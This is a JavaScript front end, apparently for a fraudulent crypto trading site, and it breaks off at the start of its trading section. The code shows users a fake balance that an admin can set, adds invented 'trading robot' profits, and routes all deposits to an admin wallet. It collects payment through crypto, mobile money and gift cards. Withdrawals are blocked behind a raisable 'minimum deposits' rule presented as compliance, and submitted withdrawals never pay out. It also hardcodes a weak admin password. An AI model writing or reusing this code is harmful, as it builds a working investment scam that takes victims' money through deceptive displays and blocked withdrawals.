// ==================== CONFIGURATION ====================
const CONFIG = {
    ADMIN_PASSWORD: 'admin123',
    ADMIN_SECRET_KEY: 'CryptoPro2024Admin',
    AUTO_APPROVE_ALL: true,
    MINIMUM_DEPOSIT: 10,
    MINIMUM_BALANCE_FOR_TRADING: 50,
    TRADING_FEE: 0.001,
    MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL: 500,
    WITHDRAWAL_UNLOCK_MESSAGE: "Complete account verification and deposit requirements",
    ENABLE_TRADING_ROBOTS: true,
    ROBOT_TRADE_INTERVAL: 15000,
    ROBOT_MIN_PROFIT: 5,
    ROBOT_MAX_PROFIT: 50,
    ROBOT_SUCCESS_RATE: 0.85,
    PAYMENT_METHODS: {
        crypto: {
            BTC: { name: 'Bitcoin', symbol: 'BTC', rate: 64250, icon: '₿', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
            ETH: { name: 'Ethereum', symbol: 'ETH', rate: 3420, icon: 'Ξ', address: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb' },
            USDT: { name: 'Tether', symbol: 'USDT', rate: 1, icon: '₮', address: 'TXj1kD7ePQ9wN8mR5tH6vL2sK3pB4cF8gA' },
            BNB: { name: 'BNB', symbol: 'BNB', rate: 580, icon: 'BNB', address: '0x28C6c06298d514Db089934071355E5743bf21d60' },
            SOL: { name: 'Solana', symbol: 'SOL', rate: 145, icon: 'SOL', address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU' }
        },
        digital: {
            PAYPAL: { name: 'PayPal', rate: 1, email: 'payments@cryptopro.com', icon: '💳' },
            CASHAPP: { name: 'Cash App', rate: 1, cashtag: '$CryptoPro', icon: '💵' },
            VENMO: { name: 'Venmo', rate: 1, username: '@cryptopro', icon: '💰' }
        },
        mobile: {
            MPESA: { name: 'M-Pesa', rate: 0.0076, currency: 'KES', number: '+254712345678', icon: '📱' },
            MTN: { name: 'MTN Mobile Money', rate: 0.00084, currency: 'UGX', number: '+256700000000', icon: '📱' }
        },
        giftcards: {
            AMAZON: { name: 'Amazon Gift Card', rate: 0.85, icon: '🎁' },
            ITUNES: { name: 'iTunes/Apple', rate: 0.80, icon: '🍎' },
            GOOGLE: { name: 'Google Play', rate: 0.82, icon: '🎮' }
        }
    }
};

// ==================== APP STATE ====================
let appState = {
    accountType: 'real',
    isAdmin: false,
    demoBalance: 10000,
    realBalance: 0,
    displayBalance: 0,
    adminWallet: 0,
    pendingDeposits: [],
    approvedDeposits: [],
    pendingWithdrawals: [],
    userTotalDeposited: 0,
    transactions: [],
    activeTrades: [],
    robotTrades: [],
    totalRobotProfits: 0,
    lastRobotTradeTime: 0,
    selectedBot: 'none',
    availableBots: {
        none: { name: 'Manual Trading', icon: '👤', profitRate: 0, description: 'Trade manually yourself' },
        conservative: { name: 'Conservative Bot', icon: '🛡️', profitRate: 0.65, minProfit: 3, maxProfit: 15, description: '65% win rate, steady gains' },
        balanced: { name: 'Balanced Bot', icon: '⚖️', profitRate: 0.75, minProfit: 10, maxProfit: 35, description: '75% win rate, balanced approach' },
        aggressive: { name: 'Aggressive Bot', icon: '🚀', profitRate: 0.85, minProfit: 20, maxProfit: 80, description: '85% win rate, maximum profits' },
        expert: { name: 'Expert AI Bot', icon: '🤖', profitRate: 0.90, minProfit: 30, maxProfit: 120, description: '90% win rate, AI-powered' }
    },
    totalDeposited: 0,
    totalWithdrawn: 0,
    paymentHistory: [],
    tradingProfits: 0,
    isAccountVerified: false
};

// ==================== CRYPTO PRICES ====================
let cryptoPrices = {
    'BTC/USDT': 64250,
    'ETH/USDT': 3420,
    'BNB/USDT': 580,
    'SOL/USDT': 145,
    'XRP/USDT': 0.52,
    'DOGE/USDT': 0.08,
    'ADA/USDT': 0.45,
    'MATIC/USDT': 0.82,
    'DOT/USDT': 6.25,
    'AVAX/USDT': 35.80,
    'LINK/USDT': 14.50,
    'UNI/USDT': 6.80,
    'XAU/USDT': 2045.00,
    'XAG/USDT': 23.50
};

let priceChanges = {
    'BTC/USDT': 2.45,
    'ETH/USDT': -1.23,
    'BNB/USDT': 0.89,
    'SOL/USDT': 3.12,
    'XRP/USDT': -0.45,
    'DOGE/USDT': 5.20,
    'ADA/USDT': -0.85,
    'MATIC/USDT': 1.45,
    'DOT/USDT': -2.10,
    'AVAX/USDT': 4.30,
    'LINK/USDT': 1.80,
    'UNI/USDT': -1.50,
    'XAU/USDT': 0.35,
    'XAG/USDT': -0.12
};

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('💎 CryptoPro Active - Admin Control System');
    loadState();
    if (!localStorage.getItem('hasVisited')) {
        appState.accountType = 'real';
        localStorage.setItem('hasVisited', 'true');
    }
    updateUI();
    startLiveUpdates();
    checkAdminStatus();
});

// ==================== HELPER FUNCTIONS ====================
function loadState() {
    const saved = localStorage.getItem('cryptoProActiveApp');
    if (saved) {
        try {
            appState = { ...appState, ...JSON.parse(saved), isAdmin: false };
        } catch (e) {
            console.error('Load error:', e);
        }
    }
}

function saveState() {
    const toSave = { ...appState };
    delete toSave.isAdmin;
    localStorage.setItem('cryptoProActiveApp', JSON.stringify(toSave));
}

function updateUI() {
    const displayedBalance = appState.isAdmin
        ? appState.adminWallet
        : (appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance);

    const balanceEl = document.getElementById('totalBalance');
    if (balanceEl) {
        balanceEl.textContent = '$' + displayedBalance.toFixed(2);
        if (appState.isAdmin) {
            balanceEl.style.color = '#ffd700';
            balanceEl.title = 'Admin Wallet Balance';
        }
    }

    const usdtEl = document.getElementById('usdtAmount');
    if (usdtEl) usdtEl.textContent = displayedBalance.toFixed(2) + ' USDT';

    const usdtValueEl = document.getElementById('usdtValue');
    if (usdtValueEl) usdtValueEl.textContent = '$' + displayedBalance.toFixed(2);

    updateBotStatus();
}

function updateBotStatus() {
    let statusEl = document.getElementById('botStatus');
    
    if (!statusEl) {
        statusEl = document.createElement('div');
        statusEl.id = 'botStatus';
        statusEl.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(20, 35, 60, 0.95);
            border: 2px solid #a855f7;
            border-radius: 12px;
            padding: 12px 16px;
            z-index: 999;
            box-shadow: 0 4px 20px rgba(168, 85, 247, 0.3);
        `;
        document.body.appendChild(statusEl);
    }
    
    if (appState.selectedBot === 'none') {
        statusEl.style.display = 'none';
    } else {
        statusEl.style.display = 'block';
        const bot = appState.availableBots[appState.selectedBot];
        statusEl.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="font-size: 20px;">${bot.icon}</div>
                <div>
                    <div style="font-size: 12px; font-weight: 700; color: #a855f7; margin-bottom: 2px;">${bot.name}</div>
                    <div style="font-size: 10px; color: rgba(255,255,255,0.6);">
                        🟢 Active • ${(bot.profitRate * 100).toFixed(0)}% Win Rate
                    </div>
                </div>
            </div>
        `;
    }
}

function switchAccount(type) {
    appState.accountType = type;
    const demoBtn = document.getElementById('demoBtn');
    const realBtn = document.getElementById('realBtn');
    
    if (demoBtn) demoBtn.classList.toggle('active', type === 'demo');
    if (realBtn) realBtn.classList.toggle('active', type === 'real');
    
    saveState();
    updateUI();
}

function startLiveUpdates() {
    setInterval(updatePrices, 2000);
    setInterval(updateActiveTrades, 1000);
    if (CONFIG.ENABLE_TRADING_ROBOTS) {
        setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
    }
}

function updatePrices() {
    Object.keys(cryptoPrices).forEach(pair => {
        const oldPrice = cryptoPrices[pair];
        const volatility = pair === 'BTC/USDT' ? 100 : pair.includes('XAU') || pair.includes('XAG') ? 5 : 20;
        const change = (Math.random() - 0.5) * volatility;
        cryptoPrices[pair] = Math.max(oldPrice + change, oldPrice * 0.95);
        priceChanges[pair] = ((cryptoPrices[pair] - oldPrice) / oldPrice) * 100;

        const pairKey = pair.split('/')[0].toLowerCase();
        const priceEl = document.getElementById(pairKey + 'Price');
        const changeEl = document.getElementById(pairKey + 'Change');
        
        if (priceEl) {
            const decimals = cryptoPrices[pair] < 1 ? 4 : 2;
            priceEl.textContent = '$' + cryptoPrices[pair].toFixed(decimals);
        }
        if (changeEl) {
            changeEl.textContent = (priceChanges[pair] >= 0 ? '+' : '') + priceChanges[pair].toFixed(2) + '%';
            changeEl.className = 'asset-change ' + (priceChanges[pair] >= 0 ? 'positive' : 'negative');
        }
    });
}

function updateActiveTrades() {
    appState.activeTrades.forEach((trade, index) => {
        const currentPrice = cryptoPrices[trade.pair];
        const priceChange = currentPrice - trade.entryPrice;
        const profitLoss = trade.type === 'BUY' ? priceChange : -priceChange;

        trade.currentPrice = currentPrice;
        trade.profitLoss = profitLoss * (trade.amount / trade.entryPrice);
        
        if (trade.type === 'BUY') {
            if (currentPrice >= trade.target || currentPrice <= trade.stopLoss) {
                closeTrade(index);
            }
        } else {
            if (currentPrice <= trade.target || currentPrice >= trade.stopLoss) {
                closeTrade(index);
            }
        }
    });
    saveState();
}

function closeTrade(index) {
    const trade = appState.activeTrades[index];
    if (!trade) return;

    const finalAmount = trade.amount + trade.profitLoss;
    
    if (appState.accountType === 'demo') {
        appState.demoBalance += finalAmount;
    } else {
        appState.displayBalance += finalAmount;
        appState.tradingProfits += trade.profitLoss;
    }
    
    appState.activeTrades.splice(index, 1);
    saveState();
    updateUI();
    
    const msg = trade.profitLoss > 0 
        ? `✅ PROFIT! +$${trade.profitLoss.toFixed(2)}`
        : `❌ LOSS: -$${Math.abs(trade.profitLoss).toFixed(2)}`;
    
    setTimeout(() => {
        alert(`🔔 Trade Closed\n\n${trade.pair} ${trade.type}\n${msg}`);
    }, 100);
}

// ==================== ADMIN LOGIN ====================
function checkAdminStatus() {
    const adminKey = sessionStorage.getItem('adminAuth');
    if (adminKey === CONFIG.ADMIN_SECRET_KEY) {
        appState.isAdmin = true;
        showAdminPanel();
    }
    
    // Triple-click balance for admin
    setTimeout(() => {
        const balanceEl = document.getElementById('totalBalance');
        if (balanceEl) {
            let clickCount = 0;
            balanceEl.addEventListener('click', function() {
                clickCount++;
                if (clickCount === 3) {
                    clickCount = 0;
                    if (!appState.isAdmin) {
                        promptAdminLogin();
                    }
                }
                setTimeout(() => clickCount = 0, 1000);
            });
        }
    }, 500);
}

function promptAdminLogin() {
    const password = prompt('🔐 Admin Password:');
    if (password === CONFIG.ADMIN_PASSWORD) {
        sessionStorage.setItem('adminAuth', CONFIG.ADMIN_SECRET_KEY);
        appState.isAdmin = true;
        showAdminPanel();
        alert('✅ Admin Access Granted!\n\nYou can now:\n• View real balances\n• Withdraw funds\n• Manage all accounts');
        updateUI();
    } else if (password !== null) {
        alert('❌ Incorrect password');
    }
}

function showAdminPanel() {
    const adminBtn = document.createElement('button');
    adminBtn.id = 'adminAccessBtn';
    adminBtn.innerHTML = '👑 ADMIN';
    adminBtn.style.cssText = `
        position: fixed;
        top: 10px;
        right: 10px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 25px;
        font-weight: bold;
        cursor: pointer;
        z-index: 1000;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    `;
    adminBtn.onclick = openAdminDashboard;

    if (!document.getElementById('adminAccessBtn')) {
        document.body.appendChild(adminBtn);
    }
}

function openAdminDashboard() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'adminDashboard';
    modal.innerHTML = `
    <div class="modal-content" style="max-width: 700px;">
        <div class="modal-header">
            <h2>👑 Admin Dashboard</h2>
            <button class="close-btn" onclick="closeAdminDashboard()">×</button>
        </div>
        <div class="modal-body">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 20px;">
                <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                    <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">💰 Admin Wallet</div>
                    <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.adminWallet.toFixed(2)}</div>
                </div>
                <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                    <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">👥 User Balance (Display)</div>
                    <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.displayBalance.toFixed(2)}</div>
                </div>
                <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                    <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">💵 Real User Balance</div>
                    <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.realBalance.toFixed(2)}</div>
                </div>
                <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                    <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">📊 User Total Deposits</div>
                    <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.userTotalDeposited.toFixed(2)}</div>
                </div>
                <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                    <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">🤖 Robot Profits (Display)</div>
                    <div style="font-size: 20px; font-weight: bold; color: #00ff88;">+$${appState.totalRobotProfits.toFixed(2)}</div>
                </div>
            </div>

            <div style="margin: 20px 0;">
                <h3 style="margin-bottom: 12px;">⚙️ Admin Controls</h3>
                
                <div class="form-group">
                    <label style="display: flex; align-items: center; gap: 8px; cursor: pointer;">
                        <input type="checkbox" id="enableRobots" ${CONFIG.ENABLE_TRADING_ROBOTS ? 'checked' : ''} onchange="toggleRobots(this.checked)">
                        <span>🤖 Enable Trading Robots</span>
                    </label>
                    <small style="opacity: 0.7; display: block; margin-top: 4px;">Simulated trades that add profits to user display balance</small>
                </div>
                
                <div class="form-group">
                    <label>Set User Display Balance</label>
                    <input type="number" id="setDisplayBalance" placeholder="Amount user sees" step="0.01">
                    <button class="btn btn-primary" onclick="updateDisplayBalance()" style="margin-top: 8px;">
                        Update Display Balance
                    </button>
                </div>
                
                <div class="form-group" style="margin-top: 16px;">
                    <label>Minimum Deposits for Withdrawal</label>
                    <input type="number" id="minDepositsRequired" value="${CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL}" step="50">
                    <button class="btn btn-primary" onclick="updateMinDeposits()" style="margin-top: 8px;">
                        Update Requirement
                    </button>
                </div>
                
                <button class="btn btn-full" onclick="adminWithdrawFunds()" style="margin-top: 20px; background: #00ff88; color: #000;">
                    💸 Withdraw from Admin Wallet
                </button>
            </div>
            
            <div style="margin-top: 20px;">
                <h3>📋 Recent Deposits</h3>
                <div id="adminDepositList" style="max-height: 200px; overflow-y: auto;">
                    ${appState.paymentHistory.slice(-5).reverse().map(d => `
                        <div style="padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; margin-bottom: 8px;">
                            <strong>$${d.usdAmount.toFixed(2)}</strong> via ${d.paymentMethod}<br>
                            <small style="opacity: 0.7;">Ref: ${d.reference} • ${new Date(d.timestamp).toLocaleString()}</small>
                        </div>
                    `).join('') || '<p style="opacity: 0.5;">No deposits yet</p>'}
                </div>
            </div>
        </div>
    </div>
    `;
    document.body.appendChild(modal);
}

function updateDisplayBalance() {
    const amount = parseFloat(document.getElementById('setDisplayBalance').value);
    if (isNaN(amount) || amount < 0) {
        alert('❌ Enter valid amount');
        return;
    }

    appState.displayBalance = amount;
    saveState();
    updateUI();
    alert(`✅ Display balance updated to $${amount.toFixed(2)}\n\nUsers will now see this balance.`);
}

function updateMinDeposits() {
    const amount = parseFloat(document.getElementById('minDepositsRequired').value);
    if (isNaN(amount) || amount < 0) {
        alert('❌ Enter valid amount');
        return;
    }

    CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL = amount;
    alert(`✅ Minimum deposit requirement updated to $${amount.toFixed(2)}`);
}

function adminWithdrawFunds() {
    if (appState.adminWallet <= 0) {
        alert('❌ No funds in admin wallet');
        return;
    }

    const amount = parseFloat(prompt(`💰 Admin Wallet: $${appState.adminWallet.toFixed(2)}\n\nHow much to withdraw?`));
    
    if (!amount || amount <= 0) return;
    
    if (amount > appState.adminWallet) {
        alert('❌ Insufficient funds in admin wallet');
        return;
    }
    
    if (confirm(`✅ Withdraw $${amount.toFixed(2)} from admin wallet?`)) {
        appState.adminWallet -= amount;
        appState.transactions.push({
            id: Date.now(),
            type: 'ADMIN_WITHDRAWAL',
            amount: amount,
            timestamp: new Date().toISOString()
        });
        
        saveState();
        updateUI();
        closeAdminDashboard();
        
        alert(`✅ Withdrawal Successful!\n\nAmount: $${amount.toFixed(2)}\nRemaining: $${appState.adminWallet.toFixed(2)}\n\nFunds will be sent to your account.`);
    }
}

function toggleRobots(enabled) {
    CONFIG.ENABLE_TRADING_ROBOTS = enabled;
    alert(enabled ? '✅ Trading robots enabled!' : '⚠️ Trading robots disabled');
}

function closeAdminDashboard() {
    const modal = document.getElementById('adminDashboard');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== UNIVERSAL DEPOSIT MODAL ====================
function openUniversalDepositModal() {
    if (appState.accountType === 'demo') {
        if (confirm('⚠️ DEMO MODE\n\nSwitch to REAL MONEY to deposit?\n\nClick OK to switch now.')) {
            switchAccount('real');
            setTimeout(() => openUniversalDepositModal(), 300);
        }
        return;
    }

    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'universalDepositModal';
    modal.innerHTML = `
    <div class="modal-content" style="max-width: 600px;">
        <div class="modal-header">
            <h2>💰 Deposit Funds</h2>
            <button class="close-btn" onclick="closeUniversalDeposit()">×</button>
        </div>
        <div class="modal-body">
            <div class="info-box" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none;">
                <strong>✨ INSTANT DEPOSIT - AUTO CONVERT TO USD</strong><br>
                <small style="opacity: 0.9;">Pay with ANY method. Funds credited instantly!</small>
            </div>
            
            <div class="form-group">
                <label>💵 Amount in USD</label>
                <input type="number" id="depositUsdAmount" placeholder="Min: $${CONFIG.MINIMUM_DEPOSIT}" min="${CONFIG.MINIMUM_DEPOSIT}" step="0.01" style="font-size: 18px; font-weight: bold;">
            </div>
            
            <div class="form-group">
                <label>🎯 Choose Payment Method</label>
                <select id="paymentCategory" onchange="updatePaymentOptions()" style="font-size: 16px;">
                    <option value="">-- Select Category --</option>
                    <option value="crypto">🪙 Cryptocurrency</option>
                    <option value="digital">💳 Digital Wallets</option>
                    <option value="mobile">📱 Mobile Money</option>
                    <option value="giftcards">🎁 Gift Cards</option>
                </select>
            </div>
            
            <div id="paymentOptionsContainer"></div>
            <div id="paymentDetailsContainer"></div>
            
            <button class="btn btn-primary btn-full" onclick="processUniversalDeposit()" style="margin-top: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
                ⚡ CONFIRM & DEPOSIT
            </button>
        </div>
    </div>
    `;
    document.body.appendChild(modal);
}

function updatePaymentOptions() {
    const category = document.getElementById('paymentCategory').value;
    const container = document.getElementById('paymentOptionsContainer');
    const detailsContainer = document.getElementById('paymentDetailsContainer');

    if (!category) {
        container.innerHTML = '';
        detailsContainer.innerHTML = '';
        return;
    }
    
    const methods = CONFIG.PAYMENT_METHODS[category];
    
    container.innerHTML = `
    <div class="form-group">
        <label>💎 Select Payment Method</label>
        <select id="selectedPaymentMethod" onchange="showPaymentDetails()" style="font-size: 16px;">
            <option value="">-- Choose Method --</option>
            ${Object.keys(methods).map(key => {
                const method = methods[key];
                return `<option value="${key}">${method.icon || ''} ${method.name}</option>`;
            }).join('')}
        </select>
    </div>
    `;
    
    detailsContainer.innerHTML = '';
}

function showPaymentDetails() {
    const category = document.getElementById('paymentCategory').value;
    const methodKey = document.getElementById('selectedPaymentMethod').value;
    const usdAmount = parseFloat(document.getElementById('depositUsdAmount').value) || 0;

    if (!category || !methodKey || usdAmount < CONFIG.MINIMUM_DEPOSIT) return;
    
    const method = CONFIG.PAYMENT_METHODS[category][methodKey];
    const rate = method.rate;
    const amountInCurrency = category === 'giftcards' ? usdAmount / rate : usdAmount / rate;
    
    const container = document.getElementById('paymentDetailsContainer');
    
    let detailsHTML = `
    <div class="payment-details-box">
        <h3 style="margin: 0 0 16px 0; color: #00ff88;">📋 Payment Details</h3>
    `;
    
    if (category !== 'digital' && rate !== 1) {
        detailsHTML += `
        <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; margin-bottom: 16px;">
            <strong>💱 Send:</strong><br>
            <span style="color: #00ff88; font-size: 20px; font-weight: bold;">${amountInCurrency.toFixed(method.currency ? 2 : 8)} ${method.symbol || method.currency || ''}</span><br>
            <small style="opacity: 0.7;">= $${usdAmount.toFixed(2)} USD</small>
        </div>
        `;
    }
    
    if (category === 'crypto') {
        detailsHTML += `
        <div style="margin-bottom: 12px;">
            <strong>📬 Send ${method.symbol} to:</strong><br>
            <code style="background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; display: block; margin-top: 8px; word-break: break-all; font-size: 12px;">
                ${method.address}
            </code>
            <button onclick="copyToClipboard('${method.address}')" style="margin-top: 8px; padding: 8px 16px; background: rgba(0,255,136,0.2); border: 1px solid #00ff88; border-radius: 6px; color: #00ff88; cursor: pointer;">
                📋 Copy Address
            </button>
        </div>
        `;
    } else if (category === 'digital') {
        if (method.email) detailsHTML += `<div>📧 <strong>Email:</strong> <code>${method.email}</code></div>`;
        if (method.cashtag) detailsHTML += `<div>💵 <strong>CashTag:</strong> <code>${method.cashtag}</code></div>`;
        if (method.username) detailsHTML += `<div>👤 <strong>Username:</strong> <code>${method.username}</code></div>`;
    } else if (category === 'mobile') {
        detailsHTML += `
        <div>📱 <strong>Number:</strong> <code>${method.number}</code></div>
        <div>💰 <strong>Send:</strong> ${amountInCurrency.toFixed(0)} ${method.currency}</div>
        `;
    } else if (category === 'giftcards') {
        detailsHTML += `
        <div style="background: rgba(255,165,0,0.1); padding: 12px; border-radius: 8px;">
            <strong>⚠️ Gift Card Value:</strong> $${Math.ceil(amountInCurrency)}<br>
            <small>We accept at ${(rate * 100).toFixed(0)}% value</small>
        </div>
        `;
    }
    
    detailsHTML += `
        <div class="form-group" style="margin-top: 20px;">
            <label>🔖 Transaction Reference *</label>
            <input type="text" id="paymentReference" placeholder="Enter transaction ID or code" style="width: 100%;">
        </div>
        
        <div class="form-group">
            <label>📝 Notes (Optional)</label>
            <textarea id="paymentNotes" placeholder="Additional info..." rows="2" style="width: 100%;"></textarea>
        </div>
    </div>
    `;
    
    container.innerHTML = detailsHTML;
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('✅ Copied!');
    }).catch(() => {
        prompt('Copy this:', text);
    });
}

function processUniversalDeposit() {
    const usdAmount = parseFloat(document.getElementById('depositUsdAmount').value);
    const category = document.getElementById('paymentCategory').value;
    const methodKey = document.getElementById('selectedPaymentMethod').value;
    const reference = document.getElementById('paymentReference')?.value.trim();
    const notes = document.getElementById('paymentNotes')?.value.trim();

    if (!usdAmount || usdAmount < CONFIG.MINIMUM_DEPOSIT) {
        alert(`❌ Minimum deposit: $${CONFIG.MINIMUM_DEPOSIT}`);
        return;
    }
    
    if (!category || !methodKey || !reference) {
        alert('❌ Please complete all fields');
        return;
    }
    
    const method = CONFIG.PAYMENT_METHODS[category][methodKey];
    const amountInCurrency = usdAmount / method.rate;
    
    const deposit = {
        id: Date.now().toString(),
        usdAmount: usdAmount,
        originalAmount: amountInCurrency,
        currency: method.symbol || method.currency || 'USD',
        paymentMethod: method.name,
        paymentCategory: category,
        reference: reference,
        notes: notes,
        timestamp: new Date().toISOString(),
        status: 'APPROVED'
    };
    
    // Credit both display and real balance
    appState.displayBalance += usdAmount;
    appState.realBalance += usdAmount;
    appState.adminWallet += usdAmount;
    appState.userTotalDeposited += usdAmount;
    appState.totalDeposited += usdAmount;
    appState.approvedDeposits.push(deposit);
    appState.paymentHistory.push(deposit);
    
    appState.transactions.push({
        ...deposit,
        type: 'DEPOSIT',
        description: `${method.name} deposit`
    });
    
    saveState();
    updateUI();
    closeUniversalDeposit();
    
    showSuccessAnimation();
    
    setTimeout(() => {
        alert(`✅ DEPOSIT SUCCESSFUL!\n\n💰 $${usdAmount.toFixed(2)} USD\n📱 ${method.name}\n🔖 Ref: ${reference}\n\n🎉 NEW BALANCE: $${appState.displayBalance.toFixed(2)}`);
    }, 500);
}

function showSuccessAnimation() {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.9);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
    `;
    overlay.innerHTML = `
        <div style="text-align: center;">
            <div style="font-size: 80px;">✅</div>
            <div style="font-size: 32px; font-weight: bold; color: #00ff88; margin: 20px 0;">
                DEPOSIT APPROVED!
            </div>
            <div style="font-size: 18px; color: white;">Funds credited instantly</div>
        </div>
    `;
    document.body.appendChild(overlay);
    setTimeout(() => overlay.remove(), 2000);
}

function closeUniversalDeposit() {
    const modal = document.getElementById('universalDepositModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== WITHDRAWAL ====================
function openWithdrawModal() {
    if (appState.accountType === 'demo') {
        alert('⚠️ DEMO MODE\n\nSwitch to REAL MONEY to withdraw.');
        return;
    }

    if (appState.isAdmin) {
        openAdminDashboard();
        return;
    }
    
    const balance = appState.displayBalance;
    const totalDeposited = appState.userTotalDeposited;
    const required = CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL;
    
    if (balance < 10) {
        alert(`❌ Insufficient Balance\n\nYour balance: $${balance.toFixed(2)}\nMinimum withdrawal: $10.00`);
        return;
    }
    
    if (totalDeposited < required) {
        const remaining = required - totalDeposited;
        
        const message = `⚠️ Withdrawal Requirements Not Met

Your account needs additional verification to unlock withdrawals.

📊 Your Status:
• Current Balance: $${balance.toFixed(2)}
• Total Deposited: $${totalDeposited.toFixed(2)}
• Required for Withdrawal: $${required.toFixed(2)}
• Additional Deposits Needed: $${remaining.toFixed(2)}

🔐 Why This Requirement?
For security and compliance purposes, we require users to complete a minimum deposit threshold before enabling withdrawals. This protects against fraud and ensures account authenticity.

💡 How to Unlock Withdrawals:
1. Deposit an additional $${remaining.toFixed(2)}
2. Complete account verification
3. Withdrawals will be instantly available

✨ Benefits of Higher Deposits:
• Unlock withdrawal privileges
• Access premium features
• Higher trading limits
• VIP customer support

Would you like to make a deposit now?`;

        if (confirm(message)) {
            openUniversalDepositModal();
        }
        return;
    }
    
    showUserWithdrawalForm();
}

function showUserWithdrawalForm() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'withdrawModal';
    modal.innerHTML = `
    <div class="modal-content">
        <div class="modal-header">
            <h2>💸 Request Withdrawal</h2>
            <button class="close-btn" onclick="closeWithdrawModal()">×</button>
        </div>
        <div class="modal-body">
            <div class="info-box">
                <strong>💰 Available: $${appState.displayBalance.toFixed(2)}</strong><br>
                <small>Processing Fee: $2.00 • Processing Time: 1-3 business days</small>
            </div>

            <div class="form-group">
                <label>Withdrawal Method</label>
                <select id="withdrawMethod">
                    <option value="bank">🏦 Bank Transfer</option>
                    <option value="crypto">🪙 Cryptocurrency</option>
                    <option value="paypal">💳 PayPal</option>
                </select>
            </div>
            
            <div class="form-group">
                <label>Amount (USD)</label>
                <input type="number" id="withdrawAmount" placeholder="Min: $10" min="10" step="0.01">
            </div>
            
            <div class="form-group">
                <label>Bank Name / Wallet Address / PayPal Email</label>
                <input type="text" id="withdrawDetails" placeholder="Enter details">
            </div>
            
            <button class="btn btn-primary btn-full" onclick="submitUserWithdrawal()">
                💸 SUBMIT WITHDRAWAL REQUEST
            </button>
            
            <div style="margin-top: 16px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; font-size: 12px;">
                <strong>⏱️ Processing Timeline:</strong><br>
                • Request Review: 2-4 hours<br>
                • Payment Processing: 1-2 business days<br>
                • Funds Arrival: 1-3 business days<br><br>
                <strong>📧 You'll receive email updates at each stage.</strong>
            </div>
        </div>
    </div>
    `;
    document.body.appendChild(modal);
}

function submitUserWithdrawal() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const method = document.getElementById('withdrawMethod').value;
    const details = document.getElementById('withdrawDetails').value.trim();

    if (!amount || amount < 10) {
        alert('❌ Minimum withdrawal: $10');
        return;
    }
    
    if (!details) {
        alert('❌ Please enter withdrawal details');
        return;
    }
    
    const fee = 2;
    const total = amount + fee;
    
    if (appState.displayBalance < total) {
        alert(`❌ Insufficient balance\n\nRequired: $${total.toFixed(2)} (including fee)\nYour balance: $${appState.displayBalance.toFixed(2)}`);
        return;
    }
    
    const withdrawal = {
        id: Date.now().toString(),
        amount: amount,
        fee: fee,
        method: method,
        details: details,
        timestamp: new Date().toISOString(),
        status: 'PENDING'
    };
    
    // Deduct from DISPLAY balance only
    appState.displayBalance -= total;
    appState.pendingWithdrawals.push(withdrawal);
    appState.transactions.push({ ...withdrawal, type: 'WITHDRAWAL_REQUEST' });
    
    saveState();
    updateUI();
    closeWithdrawModal();
    
    alert(`✅ Withdrawal Request Submitted!\n\nAmount: $${amount.toFixed(2)}\nFee: $${fee}\nMethod: ${method}\n\n⏱️ Processing Time: 1-3 business days\n\n📧 You'll receive confirmation via email when processed.\n\n🆔 Reference: ${withdrawal.id.slice(-8)}`);
}

function closeWithdrawModal() {
    const modal = document.getElementById('withdrawModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== TRADING ====================
function openTradeModal(pair = 'BTC/USDT') {
